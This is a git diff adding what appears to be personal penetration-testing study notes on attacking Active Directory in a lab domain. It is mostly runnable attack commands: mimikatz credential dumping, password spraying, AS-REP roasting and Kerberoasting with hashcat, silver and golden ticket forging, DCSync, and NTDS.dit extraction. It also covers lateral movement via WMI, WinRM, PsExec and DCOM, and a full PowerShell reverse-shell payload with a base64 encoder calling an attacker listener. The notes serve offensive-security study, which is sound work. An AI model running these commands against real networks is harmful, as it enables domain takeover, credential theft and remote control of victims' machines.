@@ -1,1 +1,457 @@
 
+**Enumerating AD**
+
+enumerating users on the full domain:
+net user /domain
+
+enumerating specific users on the full domain:
+net user <username> /domain
+
+Enumerating Groups on the full domain
+net group /domain
+
+Enumerating Groups on the full domain:
+net group “group name” /domain
+
+Powerview is a script that can help us enumerate AD environments
+
+run the script then we can use the commands starting below
+
+Get-NetDomain (basic info of domain)
+Get-NetUser (enumerating all users in the domain with attributes)
+we can pipe the output to select to filter through attributes
+
+
+another example:
+Get-NetUser | select cn, pwdlastset, lastlogin
+
+
+Get-NetGroup (enumerate all groups with their attributes)
+Get-NetGroup “group name” | select member (enumerating specific groups)
+
+
+Get-NetComputer(enumerate computer objects)
+Get-NetComputer | select operatingsystem, dnshostname (this will enumerate the computers on the domain along with their operating system)
+
+Find-LocalAdminAccess (determines if the ucrrent user has admin privileges on any computer in the domain)
+
+Checking logged on users with Get-NetSession:
+Get-NetSession -ComputerName <computername>
+Get-NetSession -ComputerName files04
+
+Using PsLoggedOn to see user logons at Files04:
+.\PsLoggedon.exe \\files04
+
+Psloggedon can be downloaded from github
+
+Listing the SPN accounts in the domain:
+Get-NetUser -SPN | select samaccountname,serviceprincipalname
+
+
+Running Get-ObjectAcl specifying our user to enumerate permissions:
+
+Get-ObjectAcl -Identity stephanie
+
+Enumerating ACLs for any AD Group:
+
+Get-ObjectAcl -Identity "<groupname>" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
+
+
+Finding shares in the domain:
+
+Find-DomainShare
+
+Listing contents of the SYSVOL share:
+
+ls \\dc1.corp.com\sysvol\corp.com\. 
+By default, the SYSVOL folder is mapped to %SystemRoot%\SYSVOL\Sysvol\domain-name on the domain controller and every domain user has access to it.
+During an assessment, we should investigate every folder we discover in search of interesting items
+
+Using gpp-decrypt to decrypt the password:
+
+GPP-stored passwords are encrypted with AES-256
+
+gpp-decrypt "<gpp hash>"
+gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
+
+SharpHound is available in a few different formats. We can compile it ourselves, use an already compiled executable, or use it as a PowerShell script
+
+Importing the SharpHound script to memory:
+Import-Module .\Sharphound.ps1
+
+ Checking the SharpHound options:
+ Get-Help Invoke-BloodHound
+ 
+  Running SharpHound to collect domain data:
+  
+  Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"
+  
+  
+  
+
+
+  
+  Starting the Neo4j service in Kali Linux:
+  sudo neo4j start
+  
+  start bloodhound:
+  bloodhound
+
+
+** Attacking AD **
+
+
+mimikatz should be used to dump cached AD creds
+watch the video
+
+powershell as admin should be run,
+mimikatz 
+privilege::debug
+sekurlsa::logonpasswords(dumping hashes of logged on users)
+sekurlsa::ticket (TGT and TGS extraction)
+
+
+obtaining account policy:
+
+net accounts
+
+Authenticating using DirectoryEntry:
+
+$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+$PDC = ($domainObj.PdcRoleOwner).Name
+$SearchString = "LDAP://"
+$SearchString += $PDC + "/"
+$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
+$SearchString += $DistinguishedName
+New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
+
+If the password for the user account is correct, the object creation will be successfull
+
+
+
+
+
+Domain password spraying:
+https://github.com/dafthack/DomainPasswordSpray
+
+
+Using crackmapexec to attack user accounts:
+ 
+   crackmapexec           smb < ip address of domain system > -u < userfile or users > -p '<password or passwordfile>' -d <domain name> --continue-on-success
+ 
+ Using kerbrute to attack user accounts:
+ 
+ .\kerbrute_windows_amd64.exe passwordspray -d <domain> .\usernames.txt "<password>"
+ 
+ AS-REP Roasting;
+ 
+Using GetNPUsers to perform AS-REP roasting:
+
+impacket-GetNPUsers -dc-ip <ip in domain>  -request -outputfile hashes.asreproast domain/user
+
+for example:
+impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
+
+impacket-GetNPUsers -dc-ip 192.168.50.70   corp.com/pete -no-pass
+
+- Cracking the AS-REP hash with Hashcat:
+sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+The above should be performed in kali
+
+The commands below are for windows
+
+ Using Rubeus to obtain the AS-REP hashes:
+ 
+ .\Rubeus.exe asreproast /nowrap
+ 
+ after obtaining the hash we can simply crack it in kali like we did above
+ 
+Kerberoasting;
+
+For windows:
+
+Utilizing Rubeus to perform a Kerberoast attack:
+
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+
+Cracking the TGS-REP hashes:
+sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+
+For Linux:
+
+Using impacket-GetUserSPNs to perform Kerberoasting on Linux:
+
+sudo impacket-GetUserSPNs -request -dc-ip <ip in domain> domain/user
+for exmaple:
+sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
+
+we will crack the hash in the same manner as in windows
+
+
+Silver ticket;
+
+info needed
+1. SPN password hash
+2. Domain SID
+3. Target SPN
+
+Using Mimikatz to obtain the NTLM hash of the user account iis_service which is mapped to the target SPN:
+privilege::debug
+sekurlsa::logonpasswords
+
+
+
+Obtaining the domain SID:
+whoami /user
+
+
+
+Forging the service ticket with the user jeffadmin and injecting it into the current session:
+
+kerberos::golden /sid:<domain SID> /domain:<domain name> /ptt /target:<Target where SPN runs> /service:<SPN protocol> /rc4:<NTLM hash of SPN> /user:<user in the domain>
+
+for example:
+kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
+
+Listing Kerberos tickets to confirm the silver ticket is submitted to the current session:
+  klist
+ 
+Domain Controller Synchronization;
+
+on windows:
+
+.\mimikatz.exe
+
+lsadump::dcsync /user:<any user with format domain/user>
+for example: lsadump::dcsync /user:corp\dave
+
+
+
+
+Using Hashcat to crack the NTLM hash obtained by the dcsync attack:
+hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+We can even get the administrator hash
+
+lsadump::dcsync /user:corp\Administrator
+
+
+
+How to do this from kali:
+
+impacket-secretsdump -just-dc-user <user we want hash for> <domain>/<admin user>:"<password>"@<ip in domain>
+example:
+impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
+
+
+
+**Lateral Movement AD**
+
+We will abuse wmi features
+wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
+if we use this we can create a new calculator process, the process can be replaced with a powershell reverse one liner but this is not the right way to do it
+in powershell we run the following script
+
+$username = 'jen';
+$password = 'Nexus123!';
+$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+$options = New-CimSessionOption -Protocol DCOM
+$session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options 
+$command = 'calc';
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
+
+Now this will also do the same and run the command on the remote machine, which is currently to open a calculator but we can replace it with a powershell reverse one liner
+
+we should also encode in base64 our powershell command so we do not have any issues
+we do have a script for it
+
+import sys
+import base64
+
+payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+
+cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
+
+print(cmd)
+
+we can replace the highlighted with values of our kali
+
+The above script will generate the command we need to paste in the exploiting script
+
+
+
+This will give us  a shell on our kali listener
+
+Alterantively we can also use WinRM
+
+Executing commands remotely via WinRS:
+winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"
+
+Running the reverse-shell payload through WinRS:
+winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
+HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
+
+We can also directly use WinRM
+
+$username = 'jen';
+$password = 'Nexus123!';
+$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+New-PSSession -ComputerName 192.168.50.73 -Credential $credential
+
+
+Enter-PSSession 1
+
+f
+
+
+Psexec can also be used
+Obtaining an Interactive Shell on the Target System with PsExec:
+.\PsExec64.exe -i  \\<target hostname> -u domain\user -p <passowrd> cmd
+
+for example
+.\PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
+
+
+pass the hash;
+/usr/bin/impacket-wmiexec -hashes :<NTLM hash> <username>@<target ip>
+
+for example:
+/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
+
+Overpass the hash;
+
+we will basically turn an NTLM hash to kerberos ticket
+use mimikatz for dumping hashes
+
+privilege::debug
+sekurlsa::logonpasswords
+
+once we have the hash we can use this command to run powershell as this user
+
+
+we should now try mapping a network share on the remote server
+
+
+
+if this command successfully runs we have converted our ntlmhash to a kerberos tickest, which we can check with a klist command
+before running this command we had this output
+
+after running the command we have this output:
+
+
+now we can use any tool that uses kerberos for authentication such as psexec
+.\PsExec.exe \\files04 cmd
+
+
+
+
+Pass the Ticket;
+
+we will use mimikatz to export the tgt/tgs tickets from memory
+privilege::debug
+sekurlsa::tickets /export
+
+once this is done, the commands above saved the TGT/TGS tickets to disk in the kirbi mimikatz format
+we can verify newly generated tickets with dir filtereing out on the kirbi extension
+dir *.kirbi
+
+
+
+We can just pick and TGS ticket in the format like dave@cifs-web04.kirbi and inject through mimikatz via this command
+
+kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
+
+we have succesfully imported dave's ticket in our session meaning we can impersonate that account
+
+
+DCOM;
+
+we will use the following commands to run a remote process on a domain joined machine:
+
+$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
+$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
+
+This command will open up a calculator process on the machine with the ip metnioned above
+
+
+we can now simply replave the cmd command with a powershell comamnd and replacing the calculator process with a base64 encoded powershell reverse one liner, giving us a reverse shell on our kali listener
+
+$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
+$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
+AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
+
+'
+
+
+
+
+AD Persistence**
+
+
+we need an account which has access to a domain admin group or to have compromised the Domain Controller itself
+
+once we have the krbtgt account hash and the domain sid we can now generate the golden ticket and inject it into memory
+
+first we launch mimikatz and delete any existing kerberos tickets
+
+privilege::debug
+lsadump::lsa /patch
+
+
+
+kerberos::purge
+
+kerberos::golden /user:<user for golden ticket> /domain:<domain name> /sid:<domain sid> /krbtgt:<krbtgt hash> /ptt
+
+for example:
+kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
+
+after the golden ticket is created we launch a new cmd with
+misc::cmd
+
+when this is done we can use psexec to use our golden ticket to authenticate to any machine
+PsExec.exe \\dc1 cmd.exe
+
+
+
+the user with the golden ticket will now also be part of powerfull groups like domain admins etc
+
+
+
+however if we used psexec to connect to the ipaddress of the domain controller instead of using the hostname we will most probably be using ntlm authentication which will block our access
+make sure to use hostname for lateral movement with this persistence vector
+
+
+
+
+Shadow Copies:
+
+As domain admins we can abuse the vshadow utility to create a shadow copy that will allow us to extract the AD database ntds.dit file. once we have obtained that we can extract every user credential offline
+
+
+Performing a Shadow Copy of the entire C: drive:
+vshadow.exe -nw -p  C:
+
+
+
+once the snapshot is taken we note the shadow copy device name
+and now copy the whole ad databsae from the shadow copy to the C: drive root folder:
+
+
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
+
+reg.exe save hklm\system c:\system.bak
+
+
+then we move these files to our kali machine where we use impacket-secretsdump to extract the credentials
+
+
+impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
+
+
+
+
